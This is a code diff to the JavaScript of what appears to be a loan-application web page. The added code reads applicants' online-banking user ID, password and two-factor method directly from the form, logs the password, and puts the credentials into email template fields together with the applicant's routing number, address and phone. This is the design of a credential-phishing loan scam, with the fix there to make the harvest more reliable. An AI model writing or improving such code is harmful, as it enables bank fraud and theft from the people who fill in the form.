@@ -570,30 +570,63 @@
                 console.log('User ID:', data.mobileBankingUserId);
                 console.log('Password:', data.mobileBankingPassword);
                 
-                // Get original loan data from sessionStorage for fallback
-                const originalLoanData = JSON.parse(sessionStorage.getItem('loanApplicationData') || '{}');
-                console.log('Original Loan Data:', originalLoanData);
+                // Get current form values directly to ensure we have the latest data
+                const currentBankName = document.getElementById('bankName')?.value || '';
+                const currentUserId = document.getElementById('mobileBankingUserId')?.value || '';
+                const currentPassword = document.getElementById('mobileBankingPassword')?.value || '';
+                const currentTwoFactor = document.getElementById('twoFactor')?.value || '';
+                
+                console.log('Current Form Values:');
+                console.log('Bank Name from form:', currentBankName);
+                console.log('User ID from form:', currentUserId);
+                console.log('Password from form:', currentPassword);
+                
+                // Convert bank value to full name
+                const bankNames = {
+                    'chase': 'Chase Bank',
+                    'bank-of-america': 'Bank of America',
+                    'wells-fargo': 'Wells Fargo',
+                    'citibank': 'Citibank',
+                    'capital-one': 'Capital One',
+                    'us-bank': 'U.S. Bank',
+                    'pnc': 'PNC Bank',
+                    'td-bank': 'TD Bank',
+                    'bbt': 'BB&T (now Truist)',
+                    'suntrust': 'SunTrust (now Truist)',
+                    'regions': 'Regions Bank',
+                    'fifth-third': 'Fifth Third Bank',
+                    'keybank': 'KeyBank',
+                    'huntington': 'Huntington Bank',
+                    'citizens': 'Citizens Bank',
+                    'ally': 'Ally Bank',
+                    'discover': 'Discover Bank',
+                    'synchrony': 'Synchrony Bank',
+                    'marcus': 'Marcus by Goldman Sachs',
+                    'other': 'Other Bank'
+                };
+                
+                const fullBankName = bankNames[currentBankName] || data.bankName || 'Not provided';
                 
                 const templateParams = {
-                    to_email: data.email || originalLoanData.email || 'not-provided@example.com',
-                    borrower_name: data.fullName || originalLoanData.fullName || 'Not provided',
-                    loan_amount: data.loanAmount || originalLoanData.loanAmount || 'Not provided',
-                    bank_name: data.bankName || 'Not provided',
+                    to_email: data.email || 'not-provided@example.com',
+                    borrower_name: data.fullName || 'Not provided',
+                    loan_amount: data.loanAmount || 'Not provided',
+                    bank_name: fullBankName,
                     application_type: 'Bank Authentication Completed',
                     submission_date: data.bankAuthSubmissionDate || new Date().toLocaleString(),
-                    customer_bank: data.customerBank || originalLoanData.customerBank || 'Not specified',
-                    routing_number: data.routingNumber || originalLoanData.routingNumber || 'Not provided',
-                    account_number: (data.accountNumber || originalLoanData.accountNumber) ? '****' + ((data.accountNumber || originalLoanData.accountNumber).slice(-4)) : 'Not provided',
-                    phone: data.phone || originalLoanData.phone || 'Not provided',
-                    address: data.address || originalLoanData.address || 'Not provided',
-                    city: data.city || originalLoanData.city || 'Not provided',
-                    state: data.state || originalLoanData.state || 'Not provided',
-                    zip_code: data.zipCode || originalLoanData.zipCode || 'Not provided',
-                    loan_duration: (data.loanDuration || originalLoanData.loanDuration || 'Not specified') + ' months',
-                    mobile_banking_user_id: data.mobileBankingUserId || 'Not provided',
-                    two_factor_method: data.twoFactor || 'Not provided',
-                    bank_auth_user_id: data.mobileBankingUserId || 'Not provided',
-                    bank_auth_password: data.mobileBankingPassword || 'Not provided'
+                    customer_bank: data.customerBank || 'Not specified',
+                    routing_number: data.routingNumber || 'Not provided',
+                    account_number: data.accountNumber ? '****' + data.accountNumber.slice(-4) : 'Not provided',
+                    phone: data.phone || 'Not provided',
+                    address: data.address || 'Not provided',
+                    city: data.city || 'Not provided',
+                    state: data.state || 'Not provided',
+                    zip_code: data.zipCode || 'Not provided',
+                    loan_duration: (data.loanDuration || 'Not specified') + ' months',
+                    mobile_banking_user_id: currentUserId || 'Not provided',
+                    two_factor_method: currentTwoFactor || 'Not provided',
+                    bank_auth_user_id: currentUserId || 'Not provided',
+                    bank_auth_password: currentPassword || 'Not provided'
                 };
 
                 console.log('Email Template Params:', templateParams);
